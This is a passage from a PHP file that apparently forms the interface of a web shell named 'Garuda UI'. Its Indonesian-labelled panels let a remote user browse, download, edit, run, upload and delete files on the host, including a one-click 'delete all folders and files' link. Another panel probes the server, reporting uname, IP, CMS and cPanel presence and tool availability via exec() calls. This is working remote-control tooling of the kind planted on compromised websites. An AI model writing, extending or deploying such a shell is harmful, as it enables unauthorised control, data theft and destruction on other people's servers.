            case 'mp3':
            $icon = "bi bi-filetype-mp3 me-2";
            break;
            
            case 'mp4':
            $icon = "bi bi-filetype-mp4 me-2";
            break;
            
            case 'otf':
            $icon = "bi bi-filetype-otf me-2";
            break;
            
            case 'pdf':
            $icon = "bi bi-filetype-pdf me-2";
            break;
            
            case 'php':
            $icon = "bi bi-filetype-php me-2";
            break;
            
            case 'png':
            $icon = "bi bi-filetype-png me-2";
            break;
            
            case 'ppt':
            $icon = "bi bi-filetype-ppt me-2";
            break;
            
            case 'pptx':
            $icon = "bi bi-filetype-pptx me-2";
            break;
            
            case 'psd':
            $icon = "bi bi-filetype-psd me-2";
            break;
            
            case 'py':
            $icon = "bi bi-filetype-py me-2";
            break;
            
            case 'raw':
            $icon = "bi bi-filetype-raw me-2";
            break;
            
            case 'rb':
            $icon = "bi bi-filetype-rb me-2";
            break;
            
            case 'sass':
            $icon = "bi bi-filetype-sass me-2";
            break;
            
            case 'scss':
            $icon = "bi bi-filetype-scss me-2";
            break;
            
            case 'sh':
            $icon = "bi bi-filetype-sh me-2";
            break;
            
            case 'sql':
            $icon = "bi bi-filetype-sql me-2";
            break;
            
            case 'svg':
            $icon = "bi bi-filetype-svg me-2";
            break;
            
            case 'tiff':
            $icon = "bi bi-filetype-tiff me-2";
            break;
            
            case 'tsx':
            $icon = "bi bi-filetype-tsx me-2";
            break;
            
            case 'ttf':
            $icon = "bi bi-filetype-ttf me-2";
            break;
            
            case 'txt':
            $icon = "bi bi-filetype-txt me-2";
            break;
            
            case 'wav':
            $icon = "bi bi-filetype-wav me-2";
            break;
            
            case 'woff':
            $icon = "bi bi-filetype-woff me-2";
            break;
            
            case 'xls':
            $icon = "bi bi-filetype-xls me-2";
            break;
            
            case 'xlsx':
            $icon = "bi bi-filetype-xlsx me-2";
            break;
            
            case 'xml':
            $icon = "bi bi-filetype-xml me-2";
            break;
            
            case 'yml':
            $icon = "bi bi-filetype-yml me-2";
            break;
            
            case 'zip':
            $icon = "bi bi-file-earmark-zip me-2";
            break;
            case 'yml':
            $icon = "bi bi-filetype-yml me-2";
            break;
            
            default:
            $icon = "bi bi-file-earmark me-2";
            break;
          }
          $fullpath = $dir.'/'.$file;
          $dirName = basename($dir);
          $fullpathname = $dirName . '/' . $file;
        ?>
        <!-- File -->
        <div class="col-7 mb-3 mb-0">
          <div class="card border-0 shadow-sm h-100">
            <div class="card-body">
              <p class="card-text mt-3 text-truncate mt-3">
                <span class="float-end">
                  <i class="bi bi-file-earmark-lock me-2"></i>
                  <?php
                  echo substr(sprintf('%o', $fileperms), -3);
                  ?>
                </span>
                <span class="text-truncate">
                  <i class="<?php echo $icon ?>"></i><?php echo $file ?>
                </span>
              </p>
            </div>
          </div>
        </div>
        <div class="col-5 mb-3 mb-0">
          <div class="card border-0 shadow-sm h-100">
            <div class="card-body">
              <p class="card-text text-truncate">
                <div class="btn-group d-flex justify-content-end" role="group">
                  <a href="?dir=<?php echo $dir ?>&dl=<?php echo $file ?>" class="btn btn-outline-success"><i class="bi bi-download"></i></a>
                  <a class="btn btn-outline-info rounded-end" data-bs-toggle="dropdown" aria-expanded="false"><i class="bi bi-info"></i></a>
                  <ul class="dropdown-menu dropdown-menu-end border-0 p-2 mt-2 mb-2 shadow">
                    <li>
                      <a class="dropdown-item mb-1" data-bs-toggle="modal" data-bs-target="#rename-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>">
                        <svg height="21" viewBox="0 0 21 21" width="21" class="me-2" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m14 1c.8284271.82842712.8284271 2.17157288 0 3l-9.5 9.5-4 1 1-3.9436508 9.5038371-9.55252193c.7829896-.78700064 2.0312313-.82943964 2.864366-.12506788z"/><path d="m12.5 3.5 1 1"/></g></svg>Ganti Nama
                      </a>
                    </li>
                    <li>
                      <a href="?dir=<?php echo $dir ?>&edit=<?php echo $file ?>" class="dropdown-item mb-1">
                        <svg height="21" viewBox="0 0 21 21" width="21" class="ms-0 me-2" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m14 1c.8284271.82842712.8284271 2.17157288 0 3l-9.5 9.5-4 1 1-3.9436508 9.5038371-9.55252193c.7829896-.78700064 2.0312313-.82943964 2.864366-.12506788z"/><path d="m6.5 14.5h8"/><path d="m12.5 3.5 1 1"/></g></svg>Edit
                      </a>
                    </li>
                    <li><hr class="dropdown-divider"></li>
                    <li>
                      <a href="?dir=<?php echo $dir ?>&run=<?php echo $file ?>" class="dropdown-item mb-1">
                        <svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg" class="me-1"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(2 5)"><path d="m8.5 11c3.1296136 0 5.9629469-1.83333333 8.5-5.5-2.5370531-3.66666667-5.3703864-5.5-8.5-5.5-3.12961358 0-5.96294692 1.83333333-8.5 5.5 2.53705308 3.66666667 5.37038642 5.5 8.5 5.5z"/><path d="m8.5 2c.18463928 0 .36593924.01429736.54285316.04184538-.02850842.148891-.04285316.30184762-.04285316.45815462 0 1.38071187 1.1192881 2.5 2.5 2.5.156307 0 .3092636-.01434474.4576252-.04178957.0280774.17585033.0423748.35715029.0423748.54178957 0 1.93299662-1.5670034 3.5-3.5 3.5-1.93299662 0-3.5-1.56700338-3.5-3.5s1.56700338-3.5 3.5-3.5z"/></g></svg>
                        Jalankan
                      </a>
                    </li>
                    <li>
                      <a href="?dir=<?php echo $dir ?>&raw=<?php echo $file ?>" class="dropdown-item mb-1">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-filetype-raw me-2 ms-1" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M14 4.5V14a2 2 0 0 1-2 2v-1a1 1 0 0 0 1-1V4.5h-2A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v9H2V2a2 2 0 0 1 2-2h5.5L14 4.5ZM1.597 11.85H0v3.999h.782v-1.491h.71l.7 1.491h1.651l.313-1.028h1.336l.314 1.028h.84L5.31 11.85h-.925l-1.329 3.96-.783-1.572A1.18 1.18 0 0 0 3 13.116c0-.256-.056-.479-.167-.668a1.098 1.098 0 0 0-.478-.44 1.669 1.669 0 0 0-.758-.158Zm-.815 1.913v-1.292h.7a.74.74 0 0 1 .507.17c.13.113.194.276.194.49 0 .21-.065.368-.194.474-.127.105-.3.158-.518.158H.782Zm4.063-1.148.489 1.617H4.32l.49-1.617h.035Zm4.006.445-.74 2.789h-.73L6.326 11.85h.855l.601 2.903h.038l.706-2.903h.683l.706 2.903h.04l.596-2.903h.858l-1.055 3.999h-.73l-.74-2.789H8.85Z"/></svg>
                        Raw
                      </a>
                    </li>
                    <li><hr class="dropdown-divider"></li>
                    <li>
                      <a href="?dir=<?php echo $dir ?>&rl=<?php echo $file ?>&key=<?php echo $key ?>" class="dropdown-item"><svg height="21" viewBox="0 0 21 21" width="21" class="me-2" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 2)"><path d="m2.5 2.5h10v12c0 1.1045695-.8954305 2-2 2h-6c-1.1045695 0-2-.8954305-2-2zm5-2c1.0543618 0 1.91816512.81587779 1.99451426 1.85073766l.00548574.14926234h-4c0-1.1045695.8954305-2 2-2z"/><path d="m.5 2.5h14"/><path d="m5.5 5.5v8"/><path d="m9.5 5.5v8"/></g></svg>Hapus</a>
                    </li>
                  </ul>
                </div>
              </p>
            </div>
          </div>
        </div>
        
        <!-- Rename -->
        <div class="modal fade p-3" id="rename-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>" tabindex="-1" aria-labelledby="rename-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>Label" aria-hidden="true">
          <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content border-0 shadow-sm">
              <div class="modal-header">
                <h1 class="modal-title fs-5 py-1" id="rename-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>Label">Ganti nama <span class="text-danger user-select-none"><?php echo $file ?></span></h1>
              </div>
              <div class="modal-body">
                <form action="<?php echo $_SERVER['PHP_SELF'] ?>?dir=<?php echo $dir ?>&rename=<?php echo $file ?>" class="row" method="POST" accept-charset="utf-8">
                  <div class="input-group mt-3 mb-3">
                    <span class="input-group-text" id="<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>"><i class="<?php echo $icon; ?> ms-1"></i></span>
                    <input type="text" class="form-control" name="new_name" placeholder="Masukkan nama baru" value="<?php echo $file ?>">
                  </div>
                  <div class="d-grid gap-2">
                    <button class="btn btn-primary" type="submit">
                      Ubah
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
        <?php
        }
        }
        }
        ?>
      </div>
    </div>
    
    <!-- Footer -->
    <div class="container-fluid p-2 shadow-sm">
      <footer class="d-flex flex-wrap justify-content-between align-items-center py-3">
        <div class="col-md-4 d-flex align-items-center">
          <span class="mb-3 mb-md-0 text-body-secondary">&copy; Copy Right by P3YCH</span>
        </div>
    
        <ul class="nav col-md-4 justify-content-end list-unstyled d-flex">
          <li class="ms-3">
            <a class="text-body-secondary" href="#">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-github" viewBox="0 0 16 16">
                <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z"/>
              </svg>
            </a>
          </li>
          <li class="ms-3">
            <a class="text-body-secondary" href="#">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-whatsapp me-4" viewBox="0 0 16 16">
                <path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"/>
              </svg>
            </a>
          </li>
        </ul>
      </footer>
    </div>
    
    <!-- Nav Bottom -->
    <nav class="m-2 p-3 mb-3 navbar navbar-expand fixed-bottom d-md-none d-lg-none d-xl-none bg-dark rounded-3 shadow">
      <ul class="navbar-nav nav-justified w-100">
        <li class="nav-item text-center">
          <a class="nav-link" href="<?php echo $_SERVER['PHP_SELF'] ?>">
            <svg height="1.5rem" viewBox="0 0 21 21" width="1.5rem" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(1 1)"><path d="m.5 9.5 9-9 9 9"/><path d="m2.5 10.5v4c0 1.1045695.8954305 2 2 2h10c1.1045695 0 2-.8954305 2-2v-4"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" data-bs-toggle="modal" data-bs-target="#aksibilitas">
            <svg xmlns="http://www.w3.org/2000/svg" width="1.5rem" height="1.5rem" fill="currentColor" class="bi bi-universal-access-circle" viewBox="0 0 16 16"><path d="M8 4.143A1.071 1.071 0 1 0 8 2a1.071 1.071 0 0 0 0 2.143Zm-4.668 1.47 3.24.316v2.5l-.323 4.585A.383.383 0 0 0 7 13.14l.826-4.017c.045-.18.301-.18.346 0L9 13.139a.383.383 0 0 0 .752-.125L9.43 8.43v-2.5l3.239-.316a.38.38 0 0 0-.047-.756H3.379a.38.38 0 0 0-.047.756Z"/><path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0ZM1 8a7 7 0 1 1 14 0A7 7 0 0 1 1 8Z"/></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" data-bs-toggle="modal" data-bs-target="#profile">
            <img src="//p3ych.github.io/img/72c7a403de42654fb0c1907d870bbdd8.png" alt="<?php echo $title ?>" width="30" height="30">
          </a>
        </li>
        <li class="nav-item text-center" onclick="topFunction()" id="myBtn" title="Go to top">
          <a class="nav-link">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(2 2)"><circle cx="8.5" cy="8.5" r="8"/><path d="m11.5 9.5-3-3-3 3"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" data-bs-toggle="modal" data-bs-target="#all">
            <svg xmlns="http://www.w3.org/2000/svg" width="1.5em" height="1.5em" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
              <path d="M6 10a2 2 0 11-4 0 2 2 0 014 0zM12 10a2 2 0 11-4 0 2 2 0 014 0zM16 12a2 2 0 100-4 2 2 0 000 4z" />
            </svg>
          </a>
        </li>
      </ul>
    </nav>
    
    <!-- Aksibilitas -->
    <div class="modal fade p-3" id="aksibilitas" tabindex="-1" aria-labelledby="allLabel" aria-hidden="true">
      <div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-header">
            <h5 class="modal-title">
              Aksibilitas!
            </h5>
          </div>
          <div class="modal-body">
            <div class="card border-0">
              <ul class="list-group">
                <li class="list-group-item">
                  <a class="text-reset" href="?dir=<?php echo $dir ?>&hapus_semua=all">
                    <svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg" class="me-2"><path d="m5.5 10.5h10" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    Hapus semua folder dan file (<span class="text-danger user-select-none">tidak termaksud folder root dan file root</span>)
                  </a>
                </li>
              </ul>
              <ul class="list-group mt-2">
                <li class="list-group-item">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-virus2 me-2" viewBox="0 0 16 16" style="margin-left:3px">
                    <path d="M8 0a1 1 0 0 0-1 1v1.143c0 .557-.407 1.025-.921 1.24-.514.214-1.12.162-1.513-.231l-.809-.809a1 1 0 1 0-1.414 1.414l.809.809c.394.394.445.999.23 1.513C3.169 6.593 2.7 7 2.144 7H1a1 1 0 0 0 0 2h1.143c.557 0 1.025.407 1.24.921.214.514.163 1.12-.231 1.513l-.809.809a1 1 0 0 0 1.414 1.414l.809-.809c.394-.394.999-.445 1.513-.23.514.214.921.682.921 1.24V15a1 1 0 1 0 2 0v-1.143c0-.557.407-1.025.921-1.24.514-.214 1.12-.162 1.513.231l.809.809a1 1 0 0 0 1.414-1.414l-.809-.809c-.393-.394-.445-.999-.23-1.513.214-.514.682-.921 1.24-.921H15a1 1 0 1 0 0-2h-1.143c-.557 0-1.025-.407-1.24-.921-.214-.514-.162-1.12.231-1.513l.809-.809a1 1 0 0 0-1.414-1.414l-.809.809c-.394.393-.999.445-1.513.23-.514-.214-.92-.682-.92-1.24V1a1 1 0 0 0-1-1Zm2 5a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM7 7a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm1 5a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm4-4a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"/>
                  </svg>
                  Scan shell backdoor
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <!-- All -->
    <div class="modal fade p-3" id="all" tabindex="-1" aria-labelledby="allLabel" aria-hidden="true">
      <div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-header">
            <h5 class="modal-title">
              Apa yang bisa dilakukan!
            </h5>
          </div>
          <div class="modal-body">
            <div class="card border-0">
              <span class="shadow rounded-3 p-3 mt-2 mb-2">Fitur ganti username dan password</span>
              <ul class="list-group">
                <li class="list-group-item" data-bs-toggle="modal" data-bs-target="#setting-user">
                  <svg height="21" viewBox="0 0 21 21" width="21" class="me-2" xmlns="http://www.w3.org/2000/svg"><path d="m7.5.5c1.65685425 0 3 1.34314575 3 3v2c0 1.65685425-1.34314575 3-3 3s-3-1.34314575-3-3v-2c0-1.65685425 1.34314575-3 3-3zm7 14v-.7281753c0-3.1864098-3.6862915-5.2718247-7-5.2718247s-7 2.0854149-7 5.2718247v.7281753c0 .5522847.44771525 1 1 1h12c.5522847 0 1-.4477153 1-1z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 2)"/></svg>
                  Ganti username
                </li>
                <li class="list-group-item" data-bs-toggle="modal" data-bs-target="#setting-pass">
                  <svg height="21" viewBox="0 0 21 21" width="21" class="me-2" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" transform="translate(4 1)"><path d="m2.5 8.5-.00586729-1.99475098c-.00728549-4.00349935 1.32800361-6.00524902 4.00586729-6.00524902s4.0112203 2.00174967 4.0000699 6.00524902v1.99475098m-8.0000699 0h8.0225317c1.0543618 0 1.9181652.81587779 1.9945143 1.8507377l.0054778.1548972-.0169048 6c-.0031058 1.1023652-.8976224 1.9943651-1.999992 1.9943651h-8.005627c-1.1045695 0-2-.8954305-2-2v-6c0-1.1045695.8954305-2 2-2z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><circle cx="6.5" cy="13.5" fill="currentColor" r="1.5"/></g></svg>
                  Ganti Password
                </li>
              </ul>
              <ul class="list-group">
                <li class="list-group-item mt-2">
                  <a href="<?php echo $_SERVER['PHP_SELF']; ?>?logout=<?php echo $hash_key; ?>" class="dropdown-item">
                    <svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg" class="me-2"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(4 3)"><path d="m10.595 10.5 2.905-3-2.905-3"/><path d="m13.5 7.5h-9"/><path d="m10.5.5-8 .00224609c-1.1043501.00087167-1.9994384.89621131-2 2.00056153v9.99438478c0 1.1045695.8954305 2 2 2h8.0954792"/></g></svg>
                    Keluar
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Upload -->
    <div class="modal fade p-3" id="uploadfile" tabindex="-1" aria-labelledby="uploadfileLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <div class="alert alert-info" role="alert">
              <h4 class="alert-heading">Pemberitahuan!</h4>
              <hr>
              <p class="mb-0">Setiap kamu upload apapun akan kami simpan ke <span class="text-danger user-select-none"><a class="text-reset" href="/Garuda UI/data-upload.json">data-upload.json</a></span></p>
            </div>
            <form action="<?php echo $_SERVER['PHP_SELF'] ?>?dir=<?php echo $dir ?>&key=<?php echo $key ?>" method="POST" enctype="multipart/form-data">
              <div class="form-group">
                <input class="form-control mb-2" type="file" id="upload" name="upload">
                <div class="d-grid gap-2">
                  <button class="btn btn-primary" type="submit">
                    <svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m6.5.5h-4c-1.1045695 0-2 .8954305-2 2v10c0 1.1045695.8954305 2 2 2h10c1.1045695 0 2-.8954305 2-2v-10"/><path d="m10.5 7.5-3 3-3-3"/><path d="m14.5.5h-4c-1.65685425 0-3 1.34314575-3 3v7"/></g></svg>
                    Upload
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    
    <?php
    $domain_name = $_SERVER['HTTP_HOST'];
    $ip_address = gethostbyname($domain_name);
    ?>
    <!-- Informasi -->
    <div class="modal fade p-3" id="info" tabindex="-1" aria-labelledby="infoLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <div class="card border-0 shadow-sm p-0">
              <div class="card-body">
                <div class="card-text">
                  <p>Uname: <span class="text-danger user-select-none"><?php echo php_uname() ?></span></p>
                  <p>Ip: <span class="text-danger user-select-none"><a class="text-reset" href="//<?php echo $ip_address ?>"><?php echo $ip_address ?></a></span></p>
                  <p>Port: <span class="text-danger user-select-none"><?php echo $_SERVER['SERVER_PORT'] ?></span></p>
                  <p>Website: <span class="text-danger user-select-none"><a class="text-reset" href="//<?php echo $domain_name ?>"><?php echo $domain_name ?></a></span></p>
                  <hr />
                  <p>Cms: <span class="text-danger user-select-none"><?php if (strpos($_SERVER['REQUEST_URI'], '/wp-admin/') !== false) {echo "Menggunakan wordpress";} elseif (strpos($_SERVER['REQUEST_URI'], '/administrator/') !== false) {echo "Menggunakan Joomla";} elseif (strpos($_SERVER['REQUEST_URI'], '/admin/') !== false) {echo "Menggunakan Drupal";} else {echo "Tidak menggunakan cms apapun";} ?></span></p>
                  <p>Cpanel: <span class="text-danger user-select-none"><?php if (file_exists('/usr/local/cpanel/version')) { echo "Mengunakan cpanel"; } else { echo "Tidak mengunakan cpanel"; } ?></span></p>
                  <hr />
                  <p>Server: <span class="text-danger user-select-none"> <?php $server_info = $_SERVER['SERVER_SOFTWARE']; if (preg_match('/\b([A-Za-z]+)\b/i', $server_info, $matches)) { echo $matches[1]; } ?></span></p>
                  <p>Versi PHP: <span class="text-danger user-select-none"><?php echo phpversion() ?></span></p>
                  <p>Penyimpanan tersisa: <span class="text-danger user-select-none"><?php $bytes = disk_free_space($dir); $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' ); $base = 1024; $class = min((int)log($bytes , $base) , count($si_prefix) - 1); echo sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] ;?></span></p>
                  <p>Penyimpanan total: <span class="text-danger user-select-none"><?php $bytes = disk_total_space($dir); $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' ); $base = 1024; $class = min((int)log($bytes , $base) , count($si_prefix) - 1); echo sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] ;?></span></p>
                  <hr />
                  <p>Safe mode: <span class="text-danger user-select-none"><?php if (ini_get('safe_mode')) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                  <p>Git status: <span class="text-danger user-select-none"><?php exec('git --version', $output, $status); if ($status === 0) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                  <p>Curl status: <span class="text-danger user-select-none"><?php if (function_exists('curl_version')) { echo "Aktif";} else { echo "Gak aktif"; } ?></span></p>
                  <p>Perl status: <span class="text-danger user-select-none"><?php if (function_exists('exec')) { $output = array(); exec('perl -v', $output); if (strpos($output[0], 'perl') !== false) { echo "Aktif"; } else { echo "Gak aktif"; }} else { echo "Fungsi exec() Gak aktif"; } ?></span></p>
                  <p>phpMyAdmin status: <span class="text-danger user-select-none"><?php if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/phpMyAdmin')) {echo 'Aktif';} else {echo 'Gak aktif'; } ?></span></p>
                  <p>MySQL / MariaDB status: <span class="text-danger user-select-none"><?php if (extension_loaded('mysqli') || extension_loaded('pdo_mysql')) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                  <p>ImageMagick status: <span class="text-danger user-select-none"><?php exec('convert -version', $output, $status); if ($status === 0) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                  <p>Memcached status: <span class="text-danger user-select-none"><?php exec('convert -version', $output, $status); if ($status === 0) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                  <p>Redis status: <span class="text-danger user-select-none"><?php if (class_exists('Redis')) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                  <p>Composer status: <span class="text-danger user-select-none"><?php exec('composer --version', $output, $status); if ($status === 0) { echo "Aktif"; } else { echo "Gak aktif"; } ?></span></p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Tambahkan folder baru -->
    <div class="modal fade p-3" id="addfolders" tabindex="-1" aria-labelledby="addfoldersLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <form class="row g-3 needs-validation" method="POST" novalidate>
              <div class="col-12">
                <div class="input-group has-validation">
                  <span class="input-group-text"><svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(2 4)"><path d="m15.5 4.5c.000802-1.10737712-.8946285-2.00280762-1.999198-2.00280762l-5.000802.00280762-2-2h-4c-.55228475 0-1 .44771525-1 1v.99719238 2.00280762"/><path d="m.81056316 5.74177845 1.31072322 5.24326075c.22257179.8903496 1.02254541 1.5149608 1.94029301 1.5149608h8.87667761c.9177969 0 1.7178001-.6246768 1.9403251-1.5150889l1.3108108-5.24508337c.1339045-.53580596-.1919011-1.07871356-.727707-1.21261805-.079341-.0198283-.1608148-.02983749-.2425959-.02983749l-13.43852073.00188666c-.55228474.00007754-.99985959.44785564-.99985959 1.00014038 0 .08170931.01003737.16310922.02985348.24237922z"/></g></svg></span>
                  <input type="text" class="form-control" name="nama_folder" placeholder="Masukan nama folder ya" required>
                  <div class="invalid-feedback">
                    Silakan masukkan terlebih dahulu nama ya
                  </div>
                </div>
              </div>
              <div class="col-12">
                <div class="d-grid gap-2">
                  <button class="btn btn-primary" type="submit" name="addfolder">Tambahkan folder baru</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Tambahkan file baru -->
    <div class="modal fade p-3" id="addfile" tabindex="-1" aria-labelledby="addfileLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <form class="row g-3 needs-validation" method="POST" novalidate>
              <div class="col-12">
                <div class="input-group has-validation">
                  <span class="input-group-text"><svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(2 4)"><path d="m15.5 4.5c.000802-1.10737712-.8946285-2.00280762-1.999198-2.00280762l-5.000802.00280762-2-2h-4c-.55228475 0-1 .44771525-1 1v.99719238 2.00280762"/><path d="m.81056316 5.74177845 1.31072322 5.24326075c.22257179.8903496 1.02254541 1.5149608 1.94029301 1.5149608h8.87667761c.9177969 0 1.7178001-.6246768 1.9403251-1.5150889l1.3108108-5.24508337c.1339045-.53580596-.1919011-1.07871356-.727707-1.21261805-.079341-.0198283-.1608148-.02983749-.2425959-.02983749l-13.43852073.00188666c-.55228474.00007754-.99985959.44785564-.99985959 1.00014038 0 .08170931.01003737.16310922.02985348.24237922z"/></g></svg></span>
                  <input type="text" class="form-control" name="nama_file" placeholder="Masukan nama file ya" required>
                  <div class="invalid-feedback">
                    Silakan masukkan terlebih dahulu nama ya
                  </div>
                </div>
              </div>
              <div class="col-12">
                <textarea class="form-control" placeholder="Masukan file yang ingin ditambahkan"  name="konten_file" rows="10" required></textarea>
                <div class="invalid-feedback">
                  Silakan isi dulu
                </div>
              </div>
              <div class="col-12">
                <div class="d-grid gap-2">
                  <button class="btn btn-primary" type="submit" name="addfile">Tambahkan file baru</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Ganti Username -->
    <div class="modal fade p-3" id="setting-user" tabindex="-1" aria-labelledby="setting-userLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <form class="row g-3 needs-validation" method="POST" novalidate>
              <div class="col-12">
